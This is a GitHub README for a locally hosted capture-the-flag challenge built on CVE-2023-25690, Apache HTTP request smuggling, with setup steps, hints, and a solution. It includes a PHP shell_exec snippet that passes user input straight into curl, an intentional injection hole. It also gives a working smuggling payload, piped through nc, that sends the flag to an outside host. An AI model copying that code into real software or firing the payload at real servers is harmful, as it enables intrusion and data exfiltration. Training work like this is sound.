# Apache-Tide-Surfing-the-Waves-of-Request-Ambiguity

<p align="center">
  <a href="#installation">Install</a> •
  <a href="#documentation">Usage</a> •
  <a href="#about">About</a> •
  <a href="#exploit">Exploit</a> •
  <a href="#demo">Demo</a>
</p>

# Installation
```bash
git clone https://github.com/vigneshsb403/Apache-Tide-Surfing-the-Waves-of-Request-Ambiguity.git
cd Apache-Tide-Surfing-the-Waves-of-Request-Ambiguity
docker compose build
docker compose up
```
now you can visit your `localhost` to view the site is up.

# Documentation
```
Challenge name: Apache Tide: Unraveling the HTTP Request Smuggling
Sub-Challenge name: Local Odyssey: Navigating the Depths of Localhost
```
The challenge name gives a overview to the player that this challenge is about request smunggling and then the sub-challenge names the player hint that they have to acess the localhost to get the flag.

```
Hint 1: Did you go through the commented html code?
Hint 2: Visit Robots.txt
Hint 3: check the Server header from the responce
```
the final hint gives idea to the player that this challenge is based on a CVE.

I in the mission breaf we can add that there is a part of code like:
```php
if(isset($_GET['secret'])){
    $secret = $_GET['secret'];
    shell_exec("curl --location '" . $secret . "/dontlookhere'"); // this sends the flag to players server.
}
```
which gives players the overview that they have to pass in a listening servers host or ip to get the flag.
# About
this challenge is based on CVE 2023 25690.

Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution. For example, something like: RewriteEngine on RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1"; [P] ProxyPassReverse /here/ http://example.com:8080/ Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning. Users are recommended to update to at least version 2.4.56 of Apache HTTP Server.

# Exploit
this challenge can be solved by sending a request like:
```bash
echo "GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php%3fsecret%3dplayerserver.com HTTP/1.1\r\nHost: hostname\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n" | nc hostname 80
```
why this instered of BurpSuite or any other proxy because it is hard to replicate the unicodes there.

The `playerserver.com` must be changed to send the request to the players server.
also the hostname must be changed accordinnly.

# Demo
To be added

